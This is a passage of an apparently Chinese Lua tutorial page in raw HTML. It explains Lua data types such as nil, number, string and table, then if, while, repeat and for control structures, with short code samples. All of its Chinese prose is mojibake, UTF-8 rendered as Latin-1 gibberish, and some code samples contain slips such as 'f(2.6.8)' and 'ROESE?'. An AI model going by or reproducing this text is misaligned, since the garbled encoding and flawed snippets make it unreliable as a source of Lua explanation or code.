nil</h5><p>nilæ˜¯ä¸€ç§åªæœ‰ä¸€ä¸ªnilå€¼çš„ç±»å‹ï¼Œå®ƒçš„ä½œç”¨å¯ä»¥ç”¨æ¥ä¸å…¶ä»–æ‰€æœ‰å€¼è¿›è¡ŒåŒºåˆ†ï¼Œä¹Ÿå¯ä»¥å½“æƒ³è¦ç§»é™¤ä¸€ä¸ªå˜é‡æ—¶ï¼Œåªéœ€è¦å°†è¯¥å˜é‡åèµ‹å€¼ä¸ºnil,åƒåœ¾å›æ”¶å°±ä¼šä¼šé‡Šæ”¾è¯¥å˜é‡æ‰€å ç”¨çš„å†…å­˜ã€‚</p><h5 id="boolean"><a class="markdownIt-Anchor" href="#boolean"></a> boolean</h5><p>booleanç±»å‹å…·æœ‰ä¸¤ä¸ªå€¼ï¼Œtrueå’Œfalseã€‚booleanç±»å‹ä¸€èˆ¬è¢«ç”¨æ¥åšæ¡ä»¶åˆ¤æ–­çš„çœŸä¸å‡ã€‚åœ¨Luaè¯­è¨€ä¸­ï¼Œåªä¼šå°†falseå’Œnilè§†ä¸ºå‡ï¼Œå…¶ä»–çš„éƒ½è§†ä¸ºçœŸï¼Œç‰¹åˆ«æ˜¯åœ¨æ¡ä»¶æ£€æµ‹ä¸­0å’Œç©ºå­—ç¬¦ä¸²éƒ½ä¼šè®¤ä¸ºæ˜¯çœŸï¼Œè¿™ä¸ªå’Œæˆ‘ä»¬ç†Ÿæ‚‰çš„å¤§å¤šæ•°è¯­è¨€ä¸å¤ªä¸€æ ·ã€‚</p><h5 id="number"><a class="markdownIt-Anchor" href="#number"></a> number</h5><p>åœ¨Lua5.3ç‰ˆæœ¬å¼€å§‹ï¼ŒLuaè¯­è¨€ä¸ºæ•°å€¼æ ¼å¼æä¾›äº†ä¸¤ç§é€‰æ‹©:integer(æ•´å‹)å’Œfloat(åŒç²¾åº¦æµ®ç‚¹å‹)[å’Œå…¶ä»–è¯­è¨€ä¸å¤ªä¸€æ ·ï¼Œfloatä¸ä»£è¡¨å•ç²¾åº¦ç±»å‹]ã€‚</p><p>æ•°å€¼å¸¸é‡çš„è¡¨ç¤ºæ–¹å¼:</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ada">&gt;<span class="hljs-number">4</span><span class="hljs-comment">--&gt;4</span><br>&gt;<span class="hljs-number">0.4</span><span class="hljs-comment">--&gt;0.4</span><br>&gt;<span class="hljs-number">4.75e-3</span><span class="hljs-comment">--&gt;0.00475</span><br>&gt;<span class="hljs-number">4.75e3</span><span class="hljs-comment">--&gt;4750</span><br></code></pre></td></tr></table></figure><p>ä¸ç®¡æ˜¯æ•´å‹è¿˜æ˜¯åŒç²¾åº¦æµ®ç‚¹å‹ï¼Œä½¿ç”¨type()å‡½æ•°æ¥å–å…¶ç±»å‹ï¼Œéƒ½ä¼šè¿”å›çš„æ˜¯number</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elm">&gt;<span class="hljs-keyword">type</span>(3)<span class="hljs-comment">--&gt;number</span><br>&gt;<span class="hljs-keyword">type</span>(3.3)<span class="hljs-comment">--&gt;number</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å®ƒä»¬ä¹‹é—´æ˜¯å¯ä»¥ç›¸äº’è½¬æ¢çš„ï¼ŒåŒæ—¶ï¼Œå…·æœ‰ç›¸åŒç®—æœ¯å€¼çš„æ•´å‹å€¼å’Œæµ®ç‚¹å‹å€¼åœ¨Luaè¯­è¨€ä¸­æ˜¯ç›¸ç­‰çš„</p><h5 id="string"><a class="markdownIt-Anchor" href="#string"></a> string</h5><p>Luaè¯­è¨€ä¸­çš„å­—ç¬¦ä¸²å³å¯ä»¥è¡¨ç¤ºå•ä¸ªå­—ç¬¦ï¼Œä¹Ÿå¯ä»¥è¡¨ç¤ºä¸€æ•´æœ¬ä¹¦ç±ã€‚åœ¨Luaè¯­è¨€ä¸­ï¼Œæ“ä½œ100Kæˆ–è€…1Mä¸ªå­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²çš„ç¨‹åºå¾ˆå¸¸è§ã€‚</p><p>å¯ä»¥ä½¿ç”¨å•å¼•å·æˆ–åŒå¼•å·æ¥å£°æ˜å­—ç¬¦ä¸²</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript">&gt;a = <span class="hljs-string">&quot;hello&quot;</span><br>&gt;b = <span class="hljs-string">&#x27;world&#x27;</span><br>&gt;<span class="hljs-built_in">print</span><span class="hljs-function"><span class="hljs-params">(a)</span>--&gt;</span>hello<br>&gt;<span class="hljs-built_in">print</span><span class="hljs-function"><span class="hljs-params">(b)</span> --&gt;</span>world<br></code></pre></td></tr></table></figure><p>å¦‚æœå£°æ˜çš„å­—ç¬¦ä¸²æ¯”è¾ƒé•¿æˆ–è€…æœ‰å¤šè¡Œï¼Œåˆ™å¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹å¼è¿›è¡Œå£°æ˜</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml">html = [[<br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Lua-string<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://www.lua.org&quot;</span>&gt;</span>Lua<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br>]]<br></code></pre></td></tr></table></figure><h5 id="table"><a class="markdownIt-Anchor" href="#table"></a> table</h5><p>â€‹tableæ˜¯Luaè¯­è¨€ä¸­æœ€ä¸»è¦å’Œå¼ºå¤§çš„æ•°æ®ç»“æ„ã€‚ä½¿ç”¨è¡¨ï¼Œ Lua è¯­è¨€å¯ä»¥ä»¥ä¸€ç§ç®€å•ã€ç»Ÿä¸€ä¸”é«˜æ•ˆçš„æ–¹å¼è¡¨ç¤ºæ•°ç»„ã€é›†åˆã€è®°å½•å’Œå…¶ä»–å¾ˆå¤šæ•°æ®ç»“æ„ã€‚ Luaè¯­è¨€ä¸­çš„è¡¨æœ¬è´¨ä¸Šæ˜¯ä¸€ç§è¾…åŠ©æ•°ç»„ã€‚è¿™ç§æ•°ç»„æ¯”Javaä¸­çš„æ•°ç»„æ›´åŠ çµæ´»ï¼Œå¯ä»¥ä½¿ç”¨æ•°å€¼åšç´¢å¼•ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²æˆ–å…¶ä»–ä»»æ„ç±»å‹çš„å€¼ä½œç´¢å¼•(é™¤nilå¤–)ã€‚</p><p>åˆ›å»ºè¡¨çš„æœ€ç®€å•æ–¹å¼:</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs node-repl"><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">a = &#123;&#125;</span><br></code></pre></td></tr></table></figure><p>åˆ›å»ºæ•°ç»„:</p><p>â€‹æˆ‘ä»¬éƒ½çŸ¥é“æ•°ç»„å°±æ˜¯ç›¸åŒæ•°æ®ç±»å‹çš„å…ƒç´ æŒ‰ç…§ä¸€å®šé¡ºåºæ’åˆ—çš„é›†åˆï¼Œé‚£ä¹ˆä½¿ç”¨tableå¦‚ä½•åˆ›å»ºä¸€ä¸ªæ•°ç»„å‘¢?</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">arr = &#123;<span class="hljs-string">&quot;TOM&quot;</span>,<span class="hljs-string">&quot;JERRY&quot;</span>,<span class="hljs-string">&quot;ROSE&quot;</span>&#125;</span><br></code></pre></td></tr></table></figure><p>â€‹è¦æƒ³è·å–æ•°ç»„ä¸­çš„å€¼ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹å†…å®¹æ¥è·å–:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(arr[<span class="hljs-number">0</span>])</span></span>nil<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(arr[<span class="hljs-number">1</span>])</span></span>TOM<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(arr[<span class="hljs-number">2</span>])</span></span>JERRY<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(arr[<span class="hljs-number">3</span>])</span></span>ROSE<br></code></pre></td></tr></table></figure><p>â€‹ä»ä¸Šé¢çš„ç»“æœå¯ä»¥çœ‹å‡ºæ¥ï¼Œæ•°ç»„çš„ä¸‹æ ‡é»˜è®¤æ˜¯ä»1å¼€å§‹çš„ã€‚æ‰€ä»¥ä¸Šè¿°åˆ›å»ºæ•°ç»„ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼æ¥åˆ›å»º</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&gt;arr <span class="hljs-operator">=</span> &#123;&#125;<br>&gt;arr[<span class="hljs-number">1</span>] <span class="hljs-operator">=</span> <span class="hljs-string">&quot;TOM&quot;</span><br>&gt;arr[<span class="hljs-number">2</span>] <span class="hljs-operator">=</span> <span class="hljs-string">&quot;JERRY&quot;</span><br>&gt;arr[<span class="hljs-number">3</span>] <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ROSE&quot;</span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢æˆ‘ä»¬è¯´è¿‡äº†ï¼Œè¡¨çš„ç´¢å¼•å³å¯ä»¥æ˜¯æ•°å­—ï¼Œä¹Ÿå¯ä»¥æ˜¯å­—ç¬¦ä¸²ç­‰å…¶ä»–çš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥å°†ç´¢å¼•æ›´æ”¹ä¸ºå­—ç¬¦ä¸²æ¥åˆ›å»º</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&gt;arr <span class="hljs-operator">=</span> &#123;&#125;<br>&gt;arr[<span class="hljs-string">&quot;X&quot;</span>] <span class="hljs-operator">=</span> <span class="hljs-number">10</span><br>&gt;arr[<span class="hljs-string">&quot;Y&quot;</span>] <span class="hljs-operator">=</span> <span class="hljs-number">20</span><br>&gt;arr[<span class="hljs-string">&quot;Z&quot;</span>] <span class="hljs-operator">=</span> <span class="hljs-number">30</span><br></code></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œå¦‚æœæƒ³è¦è·å–è¿™äº›æ•°ç»„ä¸­çš„å€¼ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æ–¹å¼</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">æ–¹å¼ä¸€<br>&gt;<span class="hljs-built_in">print</span>(arr[<span class="hljs-string">&quot;X&quot;</span>])<br>&gt;<span class="hljs-built_in">print</span>(arr[<span class="hljs-string">&quot;Y&quot;</span>])<br>&gt;<span class="hljs-built_in">print</span>(arr[<span class="hljs-string">&quot;Z&quot;</span>])<br>æ–¹å¼äºŒ<br>&gt;<span class="hljs-built_in">print</span>(arr.X)<br>&gt;<span class="hljs-built_in">print</span>(arr.Y)<br>&gt;<span class="hljs-built_in">print</span>(arr.Z)<br></code></pre></td></tr></table></figure><p>å½“å‰tableçš„çµæ´»ä¸è¿›äºæ­¤ï¼Œè¿˜æœ‰æ›´çµæ´»çš„å£°æ˜æ–¹å¼</p><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tp">&gt;arr = &#123;<span class="hljs-string">&quot;TOM&quot;</span>,<span class="hljs-keyword">X</span>=<span class="hljs-number">10</span>,<span class="hljs-string">&quot;JERRY&quot;</span>,<span class="hljs-keyword">Y</span>=<span class="hljs-number">20</span>,<span class="hljs-string">&quot;ROSE&quot;</span>,<span class="hljs-keyword">Z</span>=<span class="hljs-number">30</span>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚ä½•è·å–ä¸Šé¢çš„å€¼?</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-symbol">TOM</span> :  arr[<span class="hljs-number">1</span>]<br><span class="hljs-number">10</span>  :  arr[<span class="hljs-string">&quot;X&quot;</span>] | arr.<span class="hljs-symbol">X</span><br><span class="hljs-symbol">JERRY</span>: arr[<span class="hljs-number">2</span>]<br><span class="hljs-number">20</span>  :  arr[<span class="hljs-string">&quot;Y&quot;</span>] | arr.<span class="hljs-symbol">Y</span><br><span class="hljs-symbol">ROESE</span>?<br></code></pre></td></tr></table></figure><h5 id="function"><a class="markdownIt-Anchor" href="#function"></a> function</h5><p>åœ¨ Luaè¯­è¨€ä¸­ï¼Œå‡½æ•°ï¼ˆ Function ï¼‰æ˜¯å¯¹è¯­å¥å’Œè¡¨è¾¾å¼è¿›è¡ŒæŠ½è±¡çš„ä¸»è¦æ–¹å¼ã€‚</p><p>å®šä¹‰å‡½æ•°çš„è¯­æ³•ä¸º:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">function</span> <span class="hljs-keyword">function</span><span class="hljs-constructor">Name(<span class="hljs-params">params</span>)</span><br><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>å‡½æ•°è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œä¼ å…¥çš„å‚æ•°ä¸ªæ•°ä¸å®šä¹‰å‡½æ•°æ—¶ä½¿ç”¨çš„å‚æ•°ä¸ªæ•°ä¸ä¸€è‡´çš„æ—¶å€™ï¼ŒLua è¯­è¨€ä¼šé€šè¿‡ æŠ›å¼ƒå¤šä½™å‚æ•°å’Œå°†ä¸è¶³çš„å‚æ•°è®¾ä¸º nil çš„æ–¹å¼æ¥è°ƒæ•´å‚æ•°çš„ä¸ªæ•°ã€‚</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">function</span>  f(a,b)<br><span class="hljs-built_in">print</span>(a,b)<br>end<br><br>f<span class="hljs-function"><span class="hljs-params">()</span>--&gt;</span> nil  nil<br>f<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">2</span>)</span>--&gt;</span> <span class="hljs-number">2</span> nil<br>f<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">2</span>,<span class="hljs-number">6</span>)</span>--&gt;</span> <span class="hljs-number">2</span> <span class="hljs-number">6</span><br>f<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">2.6</span>.<span class="hljs-number">8</span>)</span>--&gt;</span> <span class="hljs-number">2</span> <span class="hljs-number">6</span> (<span class="hljs-number">8</span>è¢«ä¸¢å¼ƒ)<br></code></pre></td></tr></table></figure><p>å¯å˜é•¿å‚æ•°å‡½æ•°</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">function <span class="hljs-built_in">add</span>(<span class="hljs-built_in">..</span>.)<br>a,b,<span class="hljs-attribute">c</span>=...<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-built_in">print</span>(b)<br><span class="hljs-built_in">print</span>(c)<br>end<br><br><span class="hljs-built_in">add</span>(1,2,3)  --&gt; 1 2 3<br></code></pre></td></tr></table></figure><p>å‡½æ•°è¿”å›å€¼å¯ä»¥æœ‰å¤šä¸ªï¼Œè¿™ç‚¹å’ŒJavaä¸å¤ªä¸€æ ·</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span>(a,b)<br><span class="hljs-keyword">return</span> <span class="hljs-type">a,b</span><br><span class="hljs-keyword">end</span><br><br>x,y=f(<span class="hljs-number">11</span>,<span class="hljs-number">22</span>)<span class="hljs-comment">--&gt; x=11,y=22</span><br></code></pre></td></tr></table></figure><h5 id="thread"><a class="markdownIt-Anchor" href="#thread"></a> thread</h5><p>threadç¿»è¯‘è¿‡æ¥æ˜¯çº¿ç¨‹çš„æ„æ€ï¼Œåœ¨Luaä¸­ï¼Œthreadç”¨æ¥è¡¨ç¤ºæ‰§è¡Œçš„ç‹¬ç«‹çº¿è·¯ï¼Œç”¨æ¥æ‰§è¡ŒååŒç¨‹åºã€‚</p><h5 id="userdata"><a class="markdownIt-Anchor" href="#userdata"></a> userdata</h5><p>userdataæ˜¯ä¸€ç§ç”¨æˆ·è‡ªå®šä¹‰æ•°æ®ï¼Œç”¨äºè¡¨ç¤ºä¸€ç§ç”±åº”ç”¨ç¨‹åºæˆ–C/C++è¯­è¨€åº“æ‰€åˆ›å»ºçš„ç±»å‹ã€‚</p><h4 id="luaæ§åˆ¶ç»“æ„"><a class="markdownIt-Anchor" href="#luaæ§åˆ¶ç»“æ„"></a> Luaæ§åˆ¶ç»“æ„</h4><p>Lua è¯­è¨€æä¾›äº†ä¸€ç»„ç²¾ç®€ä¸”å¸¸ç”¨çš„æ§åˆ¶ç»“æ„ï¼ŒåŒ…æ‹¬ç”¨äºæ¡ä»¶æ‰§è¡Œçš„è¯ ä»¥åŠç”¨äºå¾ªç¯çš„ whileã€ repeat å’Œ forã€‚ æ‰€æœ‰çš„æ§åˆ¶ç»“æ„è¯­æ³•ä¸Šéƒ½æœ‰ä¸€ä¸ªæ˜¾å¼çš„ç»ˆç»“ç¬¦ï¼š end ç”¨äºç»ˆç»“ ifã€ for åŠ while ç»“æ„ï¼Œ until ç”¨äºç»ˆç»“ repeat ç»“æ„ã€‚</p><h5 id="if-then-elseif-else"><a class="markdownIt-Anchor" href="#if-then-elseif-else"></a> if then elseif else</h5><p>ifè¯­å¥å…ˆæµ‹è¯•å…¶æ¡ä»¶ï¼Œå¹¶æ ¹æ®æ¡ä»¶æ˜¯å¦æ»¡è¶³æ‰§è¡Œç›¸åº”çš„ then éƒ¨åˆ†æˆ– else éƒ¨åˆ†ã€‚ else éƒ¨åˆ† æ˜¯å¯é€‰çš„ã€‚</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testif</span><span class="hljs-params">(a)</span></span><br> <span class="hljs-keyword">if</span> a&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">then</span><br> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;aæ˜¯æ­£æ•°&quot;</span>)<br> <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testif</span><span class="hljs-params">(a)</span></span><br> <span class="hljs-keyword">if</span> a&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">then</span><br> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;aæ˜¯æ­£æ•°&quot;</span>)<br> <span class="hljs-keyword">else</span><br> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;aæ˜¯è´Ÿæ•°&quot;</span>)<br> <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>å¦‚æœè¦ç¼–å†™åµŒå¥—çš„ if è¯­å¥ï¼Œå¯ä»¥ä½¿ç”¨ elseifã€‚ å®ƒç±»ä¼¼äºåœ¨ else åé¢ç´§è·Ÿä¸€ä¸ªifã€‚æ ¹æ®ä¼ å…¥çš„å¹´é¾„è¿”å›ä¸åŒçš„ç»“æœï¼Œå¦‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">age</span>&lt;=<span class="hljs-number">18</span> é’å°‘å¹´ï¼Œ<br><span class="hljs-attribute">age</span>&gt;<span class="hljs-number">18</span> , age &lt;=<span class="hljs-number">45</span> é’å¹´<br><span class="hljs-attribute">age</span>&gt;<span class="hljs-number">45</span> , age&lt;=<span class="hljs-number">60</span> ä¸­å¹´äºº<br><span class="hljs-attribute">age</span>&gt;<span class="hljs-number">60</span> è€å¹´äºº<br><br><span class="hljs-attribute">function</span> show(age)<br><span class="hljs-attribute">if</span> age&lt;=<span class="hljs-number">18</span> then<br> <span class="hljs-attribute">return</span> <span class="hljs-string">&quot;é’å°‘å¹´&quot;</span><br><span class="hljs-attribute">elseif</span> age&gt;<span class="hljs-number">18</span> and age&lt;=<span class="hljs-number">45</span> then<br> <span class="hljs-attribute">return</span> <span class="hljs-string">&quot;é’å¹´&quot;</span><br><span class="hljs-attribute">elseif</span> age&gt;<span class="hljs-number">45</span> and age&lt;=<span class="hljs-number">60</span> then<br> <span class="hljs-attribute">return</span> <span class="hljs-string">&quot;ä¸­å¹´äºº&quot;</span><br><span class="hljs-attribute">elseif</span> age&gt;<span class="hljs-number">60</span> then<br> <span class="hljs-attribute">return</span> <span class="hljs-string">&quot;è€å¹´äºº&quot;</span><br><span class="hljs-attribute">end</span><br><span class="hljs-attribute">end</span><br></code></pre></td></tr></table></figure><h5 id="whileå¾ªç¯"><a class="markdownIt-Anchor" href="#whileå¾ªç¯"></a> whileå¾ªç¯</h5><p>é¡¾åæ€ä¹‰ï¼Œå½“æ¡ä»¶ä¸ºçœŸæ—¶ while å¾ªç¯ä¼šé‡å¤æ‰§è¡Œå…¶å¾ªç¯ä½“ã€‚ Lua è¯­è¨€å…ˆæµ‹è¯• while è¯­å¥ çš„æ¡ä»¶ï¼Œè‹¥æ¡ä»¶ä¸ºå‡åˆ™å¾ªç¯ç»“æŸï¼›å¦åˆ™ï¼Œ Lua ä¼šæ‰§è¡Œå¾ªç¯ä½“å¹¶ä¸æ–­åœ°é‡å¤è¿™ä¸ªè¿‡ç¨‹ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">while</span> æ¡ä»¶ <span class="hljs-keyword">do</span><br>  å¾ªç¯ä½“<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>ä¾‹å­:å®ç°æ•°ç»„çš„å¾ªç¯</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testWhile</span><span class="hljs-params">()</span></span><br> <span class="hljs-keyword">local</span> i = <span class="hljs-number">1</span><br> <span class="hljs-keyword">while</span> i&lt;=<span class="hljs-number">10</span> <span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">print</span>(i)<br>  i=i+<span class="hljs-number">1</span><br> <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h5 id="repeatå¾ªç¯"><a class="markdownIt-Anchor" href="#repeatå¾ªç¯"></a> repeatå¾ªç¯</h5><p>é¡¾åæ€ä¹‰ï¼Œ repeat-untilè¯­å¥ä¼šé‡å¤æ‰§è¡Œå…¶å¾ªç¯ä½“ç›´åˆ°æ¡ä»¶ä¸ºçœŸæ—¶ç»“æŸã€‚ ç”±äºæ¡ä»¶æµ‹è¯•åœ¨å¾ªç¯ä½“ä¹‹åæ‰§è¡Œï¼Œæ‰€ä»¥å¾ªç¯ä½“è‡³å°‘ä¼šæ‰§è¡Œä¸€æ¬¡ã€‚</p><p>è¯­æ³•</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">repeat</span><br> å¾ªç¯ä½“<br> <span class="hljs-keyword">until</span> æ¡ä»¶<br></code></pre></td></tr></table></figure><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testRepeat</span><span class="hljs-params">()</span></span><br> <span class="hljs-keyword">local</span> i = <span class="hljs-number">10</span><br> <span class="hljs-keyword">repeat</span><br>  <span class="hljs-built_in">print</span>(i)<br>  i=i<span class="hljs-number">-1</span><br> <span class="hljs-keyword">until</span> i &lt; <span class="hljs-number">1</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h5 id="forå¾ªç¯"><a class="markdownIt-Anchor" href="#forå¾ªç¯"></a> forå¾ªç¯</h5><p>æ•°å€¼å‹forå¾ªç¯</p><p>è¯­æ³•</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">for</span> <span class="hljs-built_in">param</span>=<span class="hljs-built_in">exp1</span>,<span class="hljs-built_in">exp2</span>,exp3 <span class="hljs-built_in">do</span><br> å¾ªç¯ä½“<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>paramçš„å€¼ä»exp1å˜åŒ–åˆ°exp2ä¹‹å‰çš„æ¯æ¬¡å¾ªç¯ä¼šæ‰§è¡Œ å¾ªç¯ä½“ï¼Œå¹¶åœ¨æ¯æ¬¡å¾ªç¯ç»“æŸåå°†æ­¥é•¿(step)exp3å¢åŠ åˆ°paramä¸Šã€‚exp3å¯é€‰ï¼Œå¦‚æœä¸è®¾ç½®é»˜è®¤ä¸º1</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> i = <span class="hljs-number">1</span>,<span class="hljs-number">100</span>,<span class="hljs-number">10</span> do<br><span class="hljs-attribute">print</span>(i)<br><span class="hljs-attribute">end</span><br></code></pre></td></tr></table></figure><p>æ³›å‹forå¾ªç¯</p><p>æ³›å‹forå¾ªç¯é€šè¿‡ä¸€ä¸ªè¿­ä»£å™¨å‡½æ•°æ¥éå†æ‰€æœ‰å€¼ï¼Œç±»ä¼¼äºjavaä¸­çš„foreachè¯­å¥ã€‚</p><p>è¯­æ³•</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">ipairs</span>(x) <span class="hljs-keyword">do</span><br>å¾ªç¯ä½“<br><span 